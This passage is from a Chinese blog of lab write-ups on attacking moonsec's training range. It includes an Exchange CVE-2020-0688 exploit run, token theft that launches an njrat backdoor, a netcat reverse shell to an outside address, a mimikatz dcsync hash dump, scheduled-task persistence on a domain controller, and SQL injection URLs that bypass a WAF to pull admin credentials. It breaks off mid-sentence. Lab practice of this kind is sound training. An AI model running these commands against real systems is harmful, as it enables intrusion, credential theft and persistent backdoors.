src=\"0NeKuJ9hCindivOTT5TDh-7sGnOwKWw1Y9yaNtc1lqw.png\" alt=\"image\"></p>\n<p><img src=\"QnPYazm6Serf8gFf1lhoh5sMvhWfeoD1uil0GjBFtU8.png\" alt=\"image\"></p>\n<h2 id=\"5-13Burpsuite-设置上游代理穷举-exchange2013账号密码\"><a href=\"#5-13Burpsuite-设置上游代理穷举-exchange2013账号密码\" class=\"headerlink\" title=\"5.13Burpsuite 设置上游代理穷举 exchange2013账号密码\"></a>5.13Burpsuite 设置上游代理穷举 exchange2013账号密码</h2><p><img src=\"BctS_rciOX30-gUogBPFMJjSoPECGxKL8W4sXUQfnNI.png\" alt=\"image\"></p>\n<p>SocksCap64 开启系统代理</p>\n<p><img src=\"WndoLgkpztrGuTXeJhOLISrn5ueMFdx4rujAR2PwPIc.png\" alt=\"image\"></p>\n<p>导入CA证书</p>\n<p><img src=\"L1so52c_mK6VBUReRCttLtVVUZL47XDDRHnXo0n_gjs.png\" alt=\"image\"></p>\n<p>下载证书之后导入，这时候浏览器不需要隧道运行，然后抓包</p>\n<p>导入常用账号和密码进行破解即可</p>\n<p><img src=\"aPIgQS0rgCN1YkXv1fm_dIq_c7tkPeUHDKAnLS9LXtI.png\" alt=\"image\"></p>\n<p>爆破到了账号密码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Moonteam\\moonsec</span><br><span class=\"line\">QWEasd456</span><br></pre></td></tr></table></figure>\n<h2 id=\"5-14使用工具利用漏洞cve-2020-0688拿下广州chang服务器\"><a href=\"#5-14使用工具利用漏洞cve-2020-0688拿下广州chang服务器\" class=\"headerlink\" title=\"5.14使用工具利用漏洞cve-2020-0688拿下广州chang服务器\"></a>5.14使用工具利用漏洞cve-2020-0688拿下广州chang服务器</h2><p>存在漏洞的版本 只需要普通的用户即可。 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Microsoft Exchange Server 2010 Service Pack 3 </span><br><span class=\"line\">Microsoft Exchange Server 2013 </span><br><span class=\"line\">Microsoft Exchange Server 2016 </span><br><span class=\"line\">Microsoft Exchange Server 2019</span><br></pre></td></tr></table></figure>\n\n\n<p>安装python3</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install requests</span><br><span class=\"line\">python -m pip install pyreadline</span><br><span class=\"line\">pyinstaller -F CVE-2020-0688_EXP.py</span><br></pre></td></tr></table></figure>\n<p>把生成的CVE-2020-0688_EXP.exe拿到服务器中执行</p>\n<p><img src=\"1iPdm32bjcawFkg4bDk_xd2rbZuPXD0m6P-TC5oPFz8.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">CVE-2020-0688_EXP.exe -s https://61.100.100.131 -u moonteam\\administrator -p QWEasd123 -c  <span class=\"string\">&quot;cmd /c c:/233.exe&quot;</span> </span><br></pre></td></tr></table></figure>\n<p><img src=\"prhDe1nagMWfdhqMcRcZtGpO6JYOU_ZywipLk8zrwjA.png\" alt=\"image\"></p>\n<p><img src=\"UcHjoUDAB9soyCrMx1C5QTR4OIWf_AZqEpGPaGGqH0o.png\" alt=\"image\"></p>\n<p><img src=\"QGurChdxafQNHwbyxMPTXW3qb0E0fufJ9OKKHzSpwNE.png\" alt=\"image\"></p>\n<h2 id=\"5-15第三层内网渗透\"><a href=\"#5-15第三层内网渗透\" class=\"headerlink\" title=\"5.15第三层内网渗透\"></a>5.15第三层内网渗透</h2><h2 id=\"5-16针对-exchang-服务器信息收集\"><a href=\"#5-16针对-exchang-服务器信息收集\" class=\"headerlink\" title=\"5.16针对 exchang 服务器信息收集\"></a>5.16针对 exchang 服务器信息收集</h2><p>当前权限是 system</p>\n<p>Whoami</p>\n<p>Tasklist</p>\n<p>有管理员在，一般就是域管理员了。</p>\n<p><img src=\"3N4huSFFBHxXe9sZ5hpatA-2SJb1iwcrPNxOO8gX_eo.png\" alt=\"image\"></p>\n<p>DNS</p>\n<p>主 10.10.10.2.128</p>\n<p>备 10.10.10.2131</p>\n<p>域 moonteam.com</p>\n<p>使用 mimikta 读不出明文。</p>\n<p> </p>\n<h2 id=\"5-17-incognito-窃取令牌域管理权限\"><a href=\"#5-17-incognito-窃取令牌域管理权限\" class=\"headerlink\" title=\"5.17. incognito 窃取令牌域管理权限\"></a>5.17. incognito 窃取令牌域管理权限</h2><p>当前的权限是 system 限制太多了。导致一些域命令不能使用。</p>\n<p>当前的环境又不是交互环境。首先窃取域管令牌再用 njrat 后门上线。</p>\n<p>incognito.exe list_tokens -u</p>\n<p><img src=\"mFKMD5Pn-QMdaePO-weZ9bSD_Ir5hVQMXq85RFTMPG8.png\" alt=\"image\"></p>\n<p>存在域管 管理员执行后门上线。 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\&gt;C:\\gongju\\incognito.exe execute  -c <span class=\"string\">&quot;moonteam\\administrator&quot;</span> C:\\gongju\\Server2.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"Pnmu1kV04mqNoiNtk_lBboBKjQZzgCJ0epOIsmhlGCI.png\" alt=\"image\"></p>\n<p>Whoami查看身份</p>\n<p><img src=\"NcgGoxtYc4hqmrm5zE268EyLKIBY4-SIP6bB5NmZmaw.png\" alt=\"image\"></p>\n<h2 id=\"5-18-NC反弹交互CNDSHEL\"><a href=\"#5-18-NC反弹交互CNDSHEL\" class=\"headerlink\" title=\"5.18 NC反弹交互CNDSHEL\"></a>5.18 NC反弹交互CNDSHEL</h2><p>本地服务监听 nc -lvnp 8899 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Exchange 上执行 c:\\nc.exe -e cmd.exe 61.100.100.129 9999</span><br></pre></td></tr></table></figure>\n<p><img src=\"AJnNkWAS3XSsKxAEslaNukkvtYBCpE8sf-l8tHUdojI.png\" alt=\"image\"></p>\n<h2 id=\"5-19-mimikatz-dcsync-导出域控用户所有-hash\"><a href=\"#5-19-mimikatz-dcsync-导出域控用户所有-hash\" class=\"headerlink\" title=\"5.19.mimikatz dcsync 导出域控用户所有 hash\"></a>5.19.mimikatz dcsync 导出域控用户所有 hash</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug </span><br><span class=\"line\">lsadump::dcsync /domain:moonteam.com /all /csv</span><br></pre></td></tr></table></figure>\n<p><img src=\"XA0w60HEI8PBC7Zt6zWTR3Oi-nIaqUndLJPxlhqdG7c.png\" alt=\"image\"></p>\n<h2 id=\"5-20-查看当前-FSMO-主机角色\"><a href=\"#5-20-查看当前-FSMO-主机角色\" class=\"headerlink\" title=\"5.20.查看当前 FSMO 主机角色\"></a>5.20.查看当前 FSMO 主机角色</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">netdom query fsmo</span><br></pre></td></tr></table></figure>\n<p><img src=\"PzKQyw8FcrWgCC1YSaK_RIK5ULwV8064_j9zNtzrAjA.png\" alt=\"image\"></p>\n<h2 id=\"5-21-列出域内组织\"><a href=\"#5-21-列出域内组织\" class=\"headerlink\" title=\"5.21.列出域内组织\"></a>5.21.列出域内组织</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dsquery ou</span><br></pre></td></tr></table></figure>\n<p><img src=\"jRyaxmXA3pRZMUYq6F2ms6u9bgNLG7Ijtj231OqxKUc.png\" alt=\"image\"></p>\n<h2 id=\"5-23-列出所有域服务器\"><a href=\"#5-23-列出所有域服务器\" class=\"headerlink\" title=\"5.23.列出所有域服务器\"></a>5.23.列出所有域服务器</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dsquery server &amp;&amp; net time /domain</span><br></pre></td></tr></table></figure>\n\n\n<p><img src=\"q0wO3ASAp8WiZ_d_Jam2dxwK5TwgeNZYpWv7b0ZCJ4U.png\" alt=\"image\"></p>\n<h2 id=\"5-24-列出域内的所有计算机名\"><a href=\"#5-24-列出域内的所有计算机名\" class=\"headerlink\" title=\"5.24.列出域内的所有计算机名\"></a>5.24.列出域内的所有计算机名</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dsquery computer domainroot -<span class=\"built_in\">limit</span> 65535 &amp;&amp; net group <span class=\"string\">&quot;domain computers&quot;</span> /domain</span><br></pre></td></tr></table></figure>\n<p><img src=\"z-lyrr8b4Hf72NVmcLj5niNM0HmsuIsD36y5P5eJg6Q.png\" alt=\"image\"></p>\n<h2 id=\"5-25-列出域内的所有用户\"><a href=\"#5-25-列出域内的所有用户\" class=\"headerlink\" title=\"5.25.列出域内的所有用户\"></a>5.25.列出域内的所有用户</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dsquery user domainroot -<span class=\"built_in\">limit</span> 65535 &amp;&amp; net user /domain</span><br></pre></td></tr></table></figure>\n<p><img src=\"lK0TSTGEEjkvAvSBH9G4pX4gnr3v-aRn4kctSsYiXq8.png\" alt=\"image\"></p>\n<p><img src=\"3pCuhmFp_HknzJwKux2fbgx7sZLRKO3Yh-FwFsEShxE.png\" alt=\"image\"></p>\n<h2 id=\"5-26-获取广州支部域控权限\"><a href=\"#5-26-获取广州支部域控权限\" class=\"headerlink\" title=\"5.26.获取广州支部域控权限\"></a>5.26.获取广州支部域控权限</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">copy Server2.exe \\\\12dc2\\c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"70zn5vEAC5yNpJPaq6KsWDtKXI7VzXCMKAvSjbv6H3Y.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">设置任务时间 以系统权限启动 </span><br><span class=\"line\">schtasks /create /s 10.10.2.129 /ru <span class=\"string\">&quot;SYSTEM&quot;</span> /tn addexe /sc DAILY /st 23:53:00 /tr c:\\\\Server2.exe /F</span><br><span class=\"line\">启动任务 schtasks /run /s 10.10.2.129 /tn addexe /i </span><br><span class=\"line\">查询任务 schtasks.exe /query /s 10.10.2.129 /tn addexe </span><br><span class=\"line\">删除命令 schtasks /delete /s 10.10.2.129 /tn addexe /f</span><br></pre></td></tr></table></figure>\n<p><img src=\"ovw1XoY5zylhumokHVoYmNfPlfnn0b81b5jT6XIfzp8.png\" alt=\"image\"></p>\n<p>域控权限已经获取 同样的总部权限也是相同方法获取。</p>\n<h2 id=\"5-27渗透广州支部运维组\"><a href=\"#5-27渗透广州支部运维组\" class=\"headerlink\" title=\"5.27渗透广州支部运维组\"></a>5.27渗透广州支部运维组</h2><p>现在已经获取域控的权限，域内的主机都可以控制。在内网较多的权限在运维组， 如果在内网控制运维组，基本上可以得到所有在域以外的服务器。如果短期无法 获取目标的信息，可以长期监控 记录 运维组，一定会有所收获。 获取运维组成员权限。 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">扫描 c 段 nbtscan -r 10.10.2.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"Pcpz0DU0AXFOPVws9MNWTKyvZnsc_gVdIc5bMy78Axg.png\" alt=\"image\"></p>\n<h2 id=\"5-28开启广州-12dc-域控-3389\"><a href=\"#5-28开启广州-12dc-域控-3389\" class=\"headerlink\" title=\"5.28开启广州 12dc 域控 3389\"></a>5.28开启广州 12dc 域控 3389</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">reg add <span class=\"string\">&quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 00000000 /f </span><br><span class=\"line\">netstat -ano | findstr “3389”</span><br></pre></td></tr></table></figure>\n<p><img src=\"9haqeffQF4t7Eg9L9OG0zIdhblBt6kDyDBNiwkGXf40.png\" alt=\"image\"></p>\n<h2 id=\"5-29-Lcx-转发-3389-隧道连接\"><a href=\"#5-29-Lcx-转发-3389-隧道连接\" class=\"headerlink\" title=\"5.29.Lcx 转发 3389 隧道连接\"></a>5.29.Lcx 转发 3389 隧道连接</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">lcx.exe -listen 2333 4489</span><br><span class=\"line\">lcx.exe -slave 61.100.100.129 2333 10.10.2.129 3389</span><br><span class=\"line\">moonteam\\administrator</span><br></pre></td></tr></table></figure>\n<p>在server中连接该端口</p>\n<p><img src=\"kvreIgZ40F3FIVuHgYDKenFp_dNbTkNmr2lNduOE7Qw.png\" alt=\"image\"></p>\n<p><img src=\"jlHEeGiUeEkLDh7wO7-PVRRsKCp_LYCUdqWiLVEja1s.png\" alt=\"image\"></p>\n<h2 id=\"5-30登录-08server1-10-10-2-144\"><a href=\"#5-30登录-08server1-10-10-2-144\" class=\"headerlink\" title=\"5.30登录 08server1 10.10.2.144\"></a>5.30登录 08server1 10.10.2.144</h2><p>本地管理员已经登录成功</p>\n<p><img src=\"DOIFxlx9J_xKaRhQWqD5czPRxOcKg1V3WBACiKdwSfM.png\" alt=\"image\"></p>\n<p> </p>\n<h2 id=\"5-31-横向渗透第四层网络\"><a href=\"#5-31-横向渗透第四层网络\" class=\"headerlink\" title=\"5.31.横向渗透第四层网络\"></a>5.31.横向渗透第四层网络</h2><p>在这台服务器上发现 vpn.txt 也存在</p>\n<p><img src=\"ROT2WVYTQ7VB6O_hsnD07dpxsDxewbS6C5kcH6QLSfY.png\" alt=\"image\"></p>\n<p><img src=\"ExSUXgJ62KpADwRzaKpZRgklpG-eZQ-_4VBMJ5Q_4Ws.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">10.10.2.134 是vpn 服务器 </span><br><span class=\"line\">arp -a 发现主机</span><br></pre></td></tr></table></figure>\n<p><img src=\"EnLMO0eWFxrxpemBhozSdTXV4wVYMI5rJMNSJNLieIU.png\" alt=\"image\"></p>\n<h2 id=\"5-32-弱口令登录目标主机\"><a href=\"#5-32-弱口令登录目标主机\" class=\"headerlink\" title=\"5.32.弱口令登录目标主机\"></a>5.32.弱口令登录目标主机</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">QWEasd123456</span><br></pre></td></tr></table></figure>\n<p><img src=\"NHvMfK6znY2gAMQnpCUQb1pflIoje1sPvUoR3Vml-iw.png\" alt=\"image\"></p>\n<p> </p>\n<p> </p>\n","categories":["打靶日记（moon）"],"tags":["红队","域渗透","打点"]},{"title":"打靶日记（四）渗透有防护的内网域","url":"/2021/12/01/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89%E6%B8%97%E9%80%8F%E6%9C%89%E9%98%B2%E6%8A%A4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F/","content":"<h1 id=\"打靶日记（四）渗透有防护的内网域\"><a href=\"#打靶日记（四）渗透有防护的内网域\" class=\"headerlink\" title=\"打靶日记（四）渗透有防护的内网域\"></a>打靶日记（四）渗透有防护的内网域</h1><p><strong>声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第四篇。</strong></p>\n<h1 id=\"1-环境说明\"><a href=\"#1-环境说明\" class=\"headerlink\" title=\"1.环境说明\"></a>1.环境说明</h1><h2 id=\"1-1文章说明\"><a href=\"#1-1文章说明\" class=\"headerlink\" title=\"1.1文章说明\"></a>1.1文章说明</h2><p>这个靶场是 attack，是 moonsec 培训用的一个靶场，因为是视频教学，所以 本文是技术文档，过程不会太详细说明，可能会让萌新产生难以理解，如需学习 整套体系可以联系暗月学习。这个靶场目标是获取域控下的 flag.txt，想要获取域 控的最终 flag 需要运用很多技能，如果能把这个靶场通关了，去任何一家安全公 司做红队测试应该不是什么问题</p>\n<h2 id=\"1-2靶场搭建\"><a href=\"#1-2靶场搭建\" class=\"headerlink\" title=\"1.2靶场搭建\"></a>1.2靶场搭建</h2><h3 id=\"1-3靶场拓扑图\"><a href=\"#1-3靶场拓扑图\" class=\"headerlink\" title=\"1.3靶场拓扑图\"></a>1.3靶场拓扑图</h3><p><img src=\"PdcFL-Q8Z_8OBqw8lhlaoGgP2vqkc4KOXfqhC6XNaxQ.png\" alt=\"image\"></p>\n<h1 id=\"2-测试过程\"><a href=\"#2-测试过程\" class=\"headerlink\" title=\"2.测试过程\"></a>2.测试过程</h1><h2 id=\"2-1netdiscover探测内网\"><a href=\"#2-1netdiscover探测内网\" class=\"headerlink\" title=\"2.1netdiscover探测内网\"></a>2.1netdiscover探测内网</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">netdiscover -i eth0 -r 192.168.8.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"LdBNv0mqZPY4oBK3VpBjaE-yFLSFfXylsZrIikoVadA.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">netdiscover -i eth0 -r 192.168.8.0/24</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-2-服务器端口扫描\"><a href=\"#2-2-服务器端口扫描\" class=\"headerlink\" title=\"2.2. 服务器端口扫描\"></a>2.2. 服务器端口扫描</h2><h3 id=\"2-2-1masscan-扫描\"><a href=\"#2-2-1masscan-扫描\" class=\"headerlink\" title=\"2.2.1masscan 扫描\"></a>2.2.1masscan 扫描</h3><p>因为服务器上安全防护软件尽量把 rate 的值调低掉调大可能会被封</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">masscan 192.168.8.114 -p 1-65535 --rate=100</span><br></pre></td></tr></table></figure>\n<p><img src=\"Of7f5b05_BlZhdWZ94KsDf7xCOvGJeb8jGGTaLK8OqI.png\" alt=\"image\"></p>\n<h3 id=\"2-2-2nmap-探测端口信息\"><a href=\"#2-2-2nmap-探测端口信息\" class=\"headerlink\" title=\"2.2.2nmap 探测端口信息\"></a>2.2.2nmap 探测端口信息</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -sV -p 3389,5985,6588,999,21,80 -A 192.168.8.114 -oA p7-attack-ports</span><br></pre></td></tr></table></figure>\n<p><img src=\"45nbV5SCslIK3I_VXGXESNz1k6T95RnFNlCgOaZzS5E.png\" alt=\"image\"></p>\n<h3 id=\"2-2-3美化-nmap-报告结果\"><a href=\"#2-2-3美化-nmap-报告结果\" class=\"headerlink\" title=\"2.2.3美化 nmap 报告结果\"></a>2.2.3美化 nmap 报告结果</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">xsltproc -o attack.html mode.xsl p7-attack-ports.xml</span><br></pre></td></tr></table></figure>\n<p>mode.xsl 是报告的模板 </p>\n<p>attack.html 是美化后的报告结果 </p>\n<p>attack-ports.xml 这是 nmap 保存的结果</p>\n<p><img src=\"LlrqKWuYcMI75KsbOnNocUYXc25-FCCP0UO_UTQxdyE.png\" alt=\"image\"></p>\n<h2 id=\"2-3绑定hosts域名\"><a href=\"#2-3绑定hosts域名\" class=\"headerlink\" title=\"2.3绑定hosts域名\"></a>2.3绑定hosts域名</h2><p>这个靶场 web 服务器的域名是 <a href=\"http://www.moonlab.com/\">www.moonlab.com</a> 在 hosts 绑定对应的 IP 方能访问 web 服务。</p>\n<p>linux 系统 &#x2F;etc&#x2F;hosts</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">windows C:\\Windows\\System32\\drivers\\etc\\hosts</span><br><span class=\"line\">192.168.8.114 www.moonlab.com</span><br><span class=\"line\">绑定后访问</span><br></pre></td></tr></table></figure>\n<p><img src=\"BC__Hsh7GyaEP9y9khYCXtnIMUORFmTPDyaK8bY8ZQY.png\" alt=\"image\"></p>\n<h2 id=\"2-4目录扫描\"><a href=\"#2-4目录扫描\" class=\"headerlink\" title=\"2.4目录扫描\"></a>2.4目录扫描</h2><p>因为目上有防火墙所以先把线程调低并发请求过多，会当作 cc 攻击拉黑处理。一般被拉黑就要等十分钟后再扫描。</p>\n<p><img src=\"fDg_0BDXQRLanKuS2yqqdzs-3ApUsp46QzVs4esLnlY.png\" alt=\"image\"></p>\n<h3 id=\"2-4-1-python-编程简单的目录扫描脚本\"><a href=\"#2-4-1-python-编程简单的目录扫描脚本\" class=\"headerlink\" title=\"2.4.1.python 编程简单的目录扫描脚本\"></a>2.4.1.python 编程简单的目录扫描脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#conding:utf-8 </span></span><br><span class=\"line\">import requests </span><br><span class=\"line\">import time </span><br><span class=\"line\">with open(<span class=\"string\">&#x27;big.txt&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>,encoding=<span class=\"string\">&#x27;UTF-8&#x27;</span>) as readfile: </span><br><span class=\"line\">  <span class=\"keyword\">for</span> <span class=\"built_in\">dirs</span> <span class=\"keyword\">in</span> readfile.readlines():</span><br><span class=\"line\">      url = <span class=\"string\">&#x27;http://www.moonlab.com/&#x27;</span>+dirs.strip(<span class=\"string\">&#x27;\\n&#x27;</span>) </span><br><span class=\"line\">      resp = requests.get(url) </span><br><span class=\"line\">      strlen = len(resp.text) </span><br><span class=\"line\">      <span class=\"built_in\">print</span>(url+<span class=\"string\">&#x27;--&#x27;</span>+str(resp.status_code)+<span class=\"string\">&#x27;---len--&#x27;</span>+str(strlen)) </span><br><span class=\"line\">      time.sleep(0.5) </span><br><span class=\"line\">      <span class=\"keyword\">if</span> resp.status_code == 200 or resp.status_code == 403 or resp.status_code == 301 or resp.status_code == 500:</span><br><span class=\"line\">        with open(<span class=\"string\">&#x27;write.txt&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>, encoding=<span class=\"string\">&#x27;UTF-8&#x27;</span>) as writefile: </span><br><span class=\"line\">          writefile.write(url+<span class=\"string\">&#x27;--&#x27;</span>+str(resp.status_code)+<span class=\"string\">&#x27;---len--&#x27;</span>+str(strlen)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">          writefile.close()</span><br></pre></td></tr></table></figure>\n<p><img src=\"0XOlRdMATgflQfhp2kVQV992d9BJtCaT_CmFY4A-YbU.png\" alt=\"image\"></p>\n<p><img src=\"rLgEmnhfXYbB0KtqMUE4JKqHdaP985ImI-QlkEeDtDs.png\" alt=\"image\"></p>\n<p>弄了个脚本扫描出来存在 <a href=\"http://www.moonlab.com/siteserver\">http://www.moonlab.com/siteserver</a></p>\n<p><img src=\"XTLIzN6VoS8cKl1HDlbFSxyEiNQApmT3pDvPQYsyM1s.png\" alt=\"image\"></p>\n<h2 id=\"2-5siteserver-漏洞利用\"><a href=\"#2-5siteserver-漏洞利用\" class=\"headerlink\" title=\"2.5siteserver 漏洞利用\"></a>2.5siteserver 漏洞利用</h2><p>siteserver 曾经爆出过很多漏洞，而且当前的版本比较低，直接用扫描器打。可</p>\n<p>以都被防护软件链接了，估计是请求较多，语句具有一定危险性都 被拦截了。</p>\n<p>需要更改脚本。<a href=\"https://github.com/johnniesong/w9scan/blob/master/plugins/2739.py\">https://github.com/johnniesong/w9scan/blob/master/plugins/2739.py</a></p>\n<p>这个是 siteserver 检测脚本，自己修改一下。</p>\n<p><img src=\"ttPt3G9Hxh-shYLJ_bDG5_vPqszsAxlvtBmcIAC8exM.png\" alt=\"image\"></p>\n<h2 id=\"2-6绕过安全狗注入\"><a href=\"#2-6绕过安全狗注入\" class=\"headerlink\" title=\"2.6绕过安全狗注入\"></a>2.6绕过安全狗注入</h2><p>安全狗会对常规的 SQL 注入会进行拦截</p>\n<p><img src=\"ONrYMms0qI4hwLbVA8Rj6RpGabilfK4JKteinIFA5lw.png\" alt=\"image\"></p>\n<p> </p>\n<p><img src=\"DM1BvsLCYI5YIaD3uRVFDWbKlgS1g9OMZUjSShrZhQs.png\" alt=\"image\"></p>\n<p>数据库版本 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNa meCollection=<span class=\"built_in\">test</span>%27)%20and%20~1=@@version;%20—</span><br></pre></td></tr></table></figure>\n<p>Microsoft SQL Server 2008 R2 (SP2) </p>\n<p>数据库名 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNa meCollection=<span class=\"built_in\">test</span>%27)%20and%20~1=db_name();%20—</span><br></pre></td></tr></table></figure>\n<p>msmoonlab </p>\n<p>用户 密码 key </p>\n<p>用户 admin </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=<span class=\"built_in\">test</span>%27)%20and%20~1=(<span class=\"keyword\">select</span>%20top%201%20username%20from%20[bairong_Administrator]);%20--</span><br></pre></td></tr></table></figure>\n<p>密文 64Cic1ERUP9n2OzxuKl9Tw&#x3D;&#x3D; </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=<span class=\"built_in\">test</span>%27)%20and%20~1=(<span class=\"keyword\">select</span>%20top%201%20password%20from%20[bairong_Administrator]);%20--</span><br></pre></td></tr></table></figure>\n<p>key LIywB&#x2F;zHFDTuEA1LU53Opg&#x3D;&#x3D;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=<span class=\"built_in\">test</span>%27)%20and%20~1=(<span class=\"keyword\">select</span>%20top%201%20PasswordSalt%20from%20[bairong_Administrator]);%20--</span><br></pre></td></tr></table></figure>\n<p><img src=\"K_XqVVtuF6poOQ3M3179ep-REpkqSRYZ5aCepTI77Cs.png\" alt=\"image\"></p>\n<table>\n<thead>\n<tr>\n<th><br>账号<br></th>\n<th><br>密文<br></th>\n<th><br>Key<br></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><br>admin<br></td>\n<td><br>64Cic1ERUP9n2OzxuKl9Tw&#x3D;&#x3D;<br></td>\n<td><br>LIywB&#x2F;zHFDTuEA1LU53Opg&#x3D;&#x3D;<br></td>\n</tr>\n</tbody></table>\n<p> </p>\n<h2 id=\"2-7反编译-net-dll-文件\"><a href=\"#2-7反编译-net-dll-文件\" class=\"headerlink\" title=\"2.7反编译.net dll 文件\"></a>2.7反编译.net dll 文件</h2><p>反编译 dll 主要用来查看网站的源码，这里主要是找到用户的加密方法。 </p>\n<p>siteserver&#x2F;login.aspx 找到对应的 dll 文件位置 </p>\n<p>&lt;%@ Page Language&#x3D;”C#” Inherits&#x3D;”UserCenter.Pages.LoginPage” %&gt;</p>\n<p>通过 dnSpy反编译得到加密文件</p>\n<h2 id=\"2-8-编写-c-siteserver-密文解密工具-在-dnSpy\"><a href=\"#2-8-编写-c-siteserver-密文解密工具-在-dnSpy\" class=\"headerlink\" title=\"2.8. 编写 c# siteserver 密文解密工具 在 dnSpy\"></a>2.8. 编写 c# siteserver 密文解密工具 在 dnSpy</h2><p>存在解密源码 DesDecrypt 方法</p>\n<h2 id=\"2-9-找回密码漏洞\"><a href=\"#2-9-找回密码漏洞\" class=\"headerlink\" title=\"2.9. 找回密码漏洞\"></a>2.9. 找回密码漏洞</h2><h2 id=\"2-10-siteserver-后台-getshell\"><a href=\"#2-10-siteserver-后台-getshell\" class=\"headerlink\" title=\"2.10 siteserver 后台 getshell\"></a>2.10 siteserver 后台 getshell</h2><p>在后台导入模板上传 zip 文件 即可获取一个 webshell，因为存在安全狗普通的 shell 和一句话都会被拦截，所以这使用暗月内部的过狗刀。</p>\n<p><img src=\"gD0zvwmfgu3k8tcQT_MCxSAQ-RbQcv0IE_6_e9lpOaU.png\" alt=\"image\"></p>\n<p><img src=\"CSyKogikD5ieRc9uuOyQv4SkJfiL22q2xOB14JgtgF4.png\" alt=\"image\"></p>\n<h2 id=\"2-11Windows-Server-2016-提权\"><a href=\"#2-11Windows-Server-2016-提权\" class=\"headerlink\" title=\"2.11Windows Server 2016 提权\"></a>2.11Windows Server 2016 提权</h2><h3 id=\"2-11-1-Windows-Server-2016-信息收集\"><a href=\"#2-11-1-Windows-Server-2016-信息收集\" class=\"headerlink\" title=\"2.11.1. Windows Server 2016 信息收集\"></a>2.11.1. Windows Server 2016 信息收集</h3><p>查看当前用户 名字 和 ip 信息</p>\n<p><img src=\"uP74hZZKpuGioddGqcBapo72wY2NmP23igAxOnqQFrQ.png\" alt=\"image\"></p>\n<p> 查看进程 服务器 收集安全防护软件信息</p>\n<p><img src=\"GqXGtOPfcwZQ3_uZNnUvzS4XE9Rdm6mW8gwLIkclEcA.png\" alt=\"image\"></p>\n<p>存在的防护软件 </p>\n<p>1. iis 安全狗 </p>\n<p>2. 服务器安全狗 </p>\n<p>3. windows firewall </p>\n<p>4. windows defender</p>\n<p> </p>\n<h3 id=\"2-11-2PrintSpoofer-提权-Windows-Server-2016\"><a href=\"#2-11-2PrintSpoofer-提权-Windows-Server-2016\" class=\"headerlink\" title=\"2.11.2PrintSpoofer 提权 Windows Server 2016\"></a>2.11.2PrintSpoofer 提权 Windows Server 2016</h3><p>工具下载地址 <a href=\"https://github.com/itm4n/PrintSpoofer\">https://github.com/itm4n/PrintSpoofer</a></p>\n<p>当前权限是 system 服务器上装有多个防护 服务器安全狗，增加用户会被拦截。</p>\n<p>最好是直接上远控，但是 windows server 2016 自带杀软 defender 远控或者</p>\n<p>shellode 